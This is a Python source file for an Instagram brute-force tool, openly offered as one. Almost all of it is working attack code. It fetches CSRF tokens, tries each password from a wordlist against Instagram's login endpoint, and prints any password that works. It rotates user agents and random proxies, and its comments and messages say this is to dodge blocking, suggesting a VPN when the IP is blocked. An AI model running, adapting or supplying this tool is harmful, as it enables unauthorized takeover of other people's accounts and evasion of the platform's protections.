# igbf: Instagram Brute Force
# description: A tool to perform brute force attack on Instagram
# dev: @s41r4j
# version: 1.1

import requests
import sys
import argparse
import datetime
import json
import random
import time
import socket
import os


def get_user_agent():
    user_agent_list = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9
Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.7 Safari/532.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13
Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13
Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5
Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5'''

    # get random line from user agent list
    return random.choice(user_agent_list.splitlines())
    
def get_csrf_token():
    session = requests.Session()
    
    header = {
        'Accept-Language': 'en-US,en;q=0.5',
	    'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Host': 'www.instagram.com',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0',
        'X-Instagram-AJAX': '1',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'sessionid': '',
        'mid': '',
        'ig_pr': '1',
        'ig_vw': '1920',
        'csrftoken': '',
        's_network': '',
        'ds_user_id': ''
    }

    session.headers.update(header)
    session.cookies.update(cookies)

    content = session.get('https://www.instagram.com/')

    return content.cookies['csrftoken']

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org', timeout=10).text
    except:
        try:
            r = requests.get('https://ip.seeip.org', timeout=10).text
        except:
            try:
                r = requests.get('https://api.myip.com', timeout=10).json()['ip']
            except:
                try:
                    r = requests.get('https://ipinfo.io/ip', timeout=10).text
                except:
                    r = 'Failed to fetch public ip'

    if r == '': r = 'Failed to fetch public ip'

    return r
    
def printit(text, center='', line_up=False, line_down=False, space_up=False, space_down=False, coledt=[0, 0, 0], normaltxt_start='', normaltxt_end=''):
    # get terminal width
    width = os.get_terminal_size().columns

    # printing text
    if space_up: print()
    if line_up: print('⸺'*width)

    print(normaltxt_start, end='')

    if len(text) < width:
        new_width = int((width - len(text))/2)
        print(center*new_width, end='')
        print(f'\33[{coledt[0]};{coledt[1]};{coledt[2]}m'+text+'\033[0m', end='')
        print(center*new_width)

    # print(normaltxt_end, end='')

    if line_down: print('⸺'*width)
    if space_down: print()


def main():
    # Taking command line arguments using argparse
    parser = argparse.ArgumentParser(description='(s41r4j:igbf)> Instagram Brute Force')
    parser.add_argument('-u', '--username', help='instagram username')
    parser.add_argument('-w', '--wordlist', help='password wordlist', metavar='WORDLIST PATH')
    parser.add_argument('-t', '--timeout', help='timeout between each request (default: 2)', default=2, type=int)
    parser.add_argument('-g', '--generate-proxy-list', help="genereate proxy list (give full path, ending with '/' or '\\')", metavar='PATH_TO_SAVE_PROXY_LIST', nargs='?')
    parser.add_argument('-p', '--proxy', help='use proxy list (give full path, ending with "/" or "\\")', metavar='PATH_TO_PROXY_LIST', nargs='?')
    args = parser.parse_args()

    # Assigning the arguments to variables
    username = args.username
    wordlist = args.wordlist
    timeout = args.timeout
    gen_proxy_list = args.generate_proxy_list
    proxy = args.proxy

    # Logo
    printit('[ Instagram Brute Force (igbf:v1.1) ]', center=' ', line_up=True, line_down=True, coledt=[7, 49, 97])
    printit('[ dev: s41r4j; https://github.com/s41r4j/igbf ]', center=' ', coledt=[1, 49, 91], line_down=True)

    # Generating proxy list
    if gen_proxy_list is not None:
        try:
            url = 'https://www.proxy-list.download/api/v1/get?type=http&anon=elite'
            proxies = requests.get(url).text.split('\r\n')
        except:
            printit('[!] Unable to generate proxy list', coledt=[1, 49, 91])
            sys.exit()
        
        path = gen_proxy_list+'igbf_proxy_list.txt'

        with open(path, 'w') as f:
            for proxy in proxies:
                f.write(proxy + '\n')

        printit('[+] Generated proxy list at location: '+path, coledt=[1, 49, 92], line_down=True)
        sys.exit()

    # Checking if the arguments have been passed
    if username is None or wordlist is None:
        parser.print_help()
        sys.exit()

    # Displaying the information
    printit(get_public_ip(), coledt=[1, 49, 96], normaltxt_start='[+] Public IP: ')
    printit("dictionary attack", line_down=True, coledt=[1, 49, 96], normaltxt_start='[+] Attack Type: ')
    printit(str(username), coledt=[1, 49, 96], normaltxt_start='[+] Username: ')
    printit(str(wordlist), coledt=[1, 49, 96], normaltxt_start='[+] Wordlist: ')
    printit(str(timeout), coledt=[1, 49, 96], normaltxt_start='[+] Timeout: ')
    printit((str(proxy) if proxy else "False"), coledt=[1, 49, 96], normaltxt_start='[+] Proxy: ', line_down=True, space_down=True)

    # Opening the wordlist
    try:
        wordlist = open(wordlist, 'r')
    except FileNotFoundError:
        printit('[!] Wordlist not found', coledt=[4, 49, 91])
        sys.exit()

    # Opening the proxy list
    if proxy is not None:
        try:
            proxy = open(proxy, 'r')
        except FileNotFoundError:
            printit('[!] Proxy list not found', coledt=[4, 49, 91])
            while True:
                choice = input('[?] Do you want to continue without proxy? (y/n): ')
                if choice.lower() == 'y':
                    print()
                    break
                elif choice.lower() == 'n':
                    sys.exit()
                else:
                    continue

    # Starting the brute force
    printit('[#] Starting the brute force...\n', coledt=[1, 49, 91])

    for password in wordlist:
        # Adding a random delay to avoid getting blocked
        time.sleep(timeout)

        # Request data
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        login_time = int(datetime.datetime.now().timestamp())
        password = password.strip()
        user_agent = get_user_agent()
        csrf_token = get_csrf_token()

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{login_time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_header = {
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token,
        }

        if proxy is not None:
            # get radom proxy from proxy list
            ran_proxy = random.choice(list(proxy))
            proxies = {
                'http': 'http://'+ran_proxy.strip(),
                'https': 'https://'+ran_proxy.strip()
            }
            print(ran_proxy, proxies)
        else:
            proxies = None

        # Sending the request
        login_response = requests.post(login_url, data=payload, headers=login_header, proxies=proxies)

        if login_response.status_code == 403 or login_response.status_code == "403":
            printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes (temp-ip-block)", coledt=[4, 49, 91])
            printit("["+str(login_response.status_code)+"]: You can also use VPN/change active vpn server to continue (temp-ip-block)", coledt=[4, 49, 91])
            printit("["+str(login_response.status_code)+"]: Check if the USERNAME entered is correct (user-not-found)", coledt=[4, 49, 91])
            sys.exit()

        json_data = json.loads(login_response.text)
        
        try:
            if json_data["user"] == False:
                print(username, normaltxt_start="\n["+str(login_response.status_code)+"] Username not found:", coledt=[4, 49, 91])
                sys.exit()
        except SystemExit:
            sys.exit()
        except:
            pass
        
        # Checking if the password is correct
        try:
            if json_data["message"] == "checkpoint_required":
                printit(password, coledt=[7, 49, 97], normaltxt_start="\n["+str(login_response.status_code)+"] Login successful (pwd)> ")
                print("\n[+] User-agent used: "+user_agent)
                print("[+] CSRF token: ", csrf_token)
                print("\n[+] Checkpoint required")
                print("[+] Checkpoint url: https://www.instagram.com"+json_data["checkpoint_url"])
                sys.exit()
        except SystemExit:
            sys.exit()
        except KeyError:
            try:
                if json_data["authenticated"] == True:
                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n["+str(login_response.status_code)+"] Login successful (pwd)> ")
                    sys.exit()
                else:
                    printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd: "+password+")", coledt=[1, 49, 93])
            except SystemExit:
                sys.exit()
            except:
                printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd: "+password+")", coledt=[1, 49, 93])
        except:
            printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd: "+password+")", coledt=[1, 49, 93])



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Exiting...')
        sys.exit()
    except requests.exceptions.ConnectionError:
        print("\n[!] Internet connection is required!\n[!] Exiting...")
        sys.exit()
